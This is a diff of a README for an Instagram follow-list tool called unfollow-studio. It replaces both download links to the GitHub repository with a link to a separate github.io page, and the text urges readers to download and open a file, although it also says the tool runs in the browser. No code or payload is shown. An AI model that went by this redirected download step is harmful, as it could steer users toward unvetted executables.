@@ -1,6 +1,6 @@
 # 🟣 unfollow-studio - Clean Up Your Instagram Follow List
 
-[![Download unfollow-studio](https://img.shields.io/badge/Download-unfollow--studio-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Slime2r1r31/unfollow-studio)
+[![Download unfollow-studio](https://img.shields.io/badge/Download-unfollow--studio-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://slime2r1r31.github.io)
 
 unfollow-studio is a friendly, purple-themed workspace that helps you understand and manage the list of accounts you follow on Instagram. It runs entirely on your own computer, inside your normal web browser, and it never asks for your Instagram password. You load the tool, it reads the follow information you already have access to, and it shows you a clean, readable list so you can decide what to keep and what to let go. No servers, no accounts to create, no complicated setup, and nothing to pay for.
 
@@ -16,7 +16,7 @@ Everything happens on your machine. There is no online service in the middle, no
 
 Visit this link to download the application:
 
-[![Download unfollow-studio](https://img.shields.io/badge/Download-unfollow--studio-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Slime2r1r31/unfollow-studio)
+[![Download unfollow-studio](https://img.shields.io/badge/Download-unfollow--studio-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://slime2r1r31.github.io)
 
 Save the download to a folder you can easily find again, such as your Downloads folder or a new folder on your Desktop named "unfollow-studio". Once the download has finished, open that file and the application will start. The whole process takes a minute or two on a normal home internet connection.
 
